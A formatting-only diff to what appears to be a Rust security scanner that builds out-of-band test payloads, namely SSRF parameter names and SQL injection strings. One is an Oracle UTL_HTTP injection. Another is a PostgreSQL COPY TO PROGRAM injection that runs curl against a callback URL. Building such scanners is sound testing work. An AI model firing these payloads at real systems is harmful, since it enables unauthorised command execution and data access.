@@ -3,9 +3,24 @@
 /// Generates SSRF payloads using HTTP callback URL
 pub fn ssrf_payloads(callback_url: &str) -> Vec<(String, String)> {
     let params = vec![
-        "url", "redirect", "next", "dest", "destination", "callback",
-        "return", "return_url", "redirect_uri", "continue", "target",
-        "rurl", "go", "link", "feed", "host", "site", "html",
+        "url",
+        "redirect",
+        "next",
+        "dest",
+        "destination",
+        "callback",
+        "return",
+        "return_url",
+        "redirect_uri",
+        "continue",
+        "target",
+        "rurl",
+        "go",
+        "link",
+        "feed",
+        "host",
+        "site",
+        "html",
     ];
 
     params
@@ -54,18 +69,12 @@ pub fn sqli_oob_payloads(callback_url: &str, callback_dns: &str) -> Vec<(String,
         // Oracle UTL_HTTP
         (
             "Oracle OOB".to_string(),
-            format!(
-                "' || UTL_HTTP.REQUEST('{}') || '",
-                callback_url
-            ),
+            format!("' || UTL_HTTP.REQUEST('{}') || '", callback_url),
         ),
         // PostgreSQL COPY
         (
             "PostgreSQL OOB".to_string(),
-            format!(
-                "'; COPY (SELECT '') TO PROGRAM 'curl {}'-- -",
-                callback_url
-            ),
+            format!("'; COPY (SELECT '') TO PROGRAM 'curl {}'-- -", callback_url),
         ),
     ]
 }
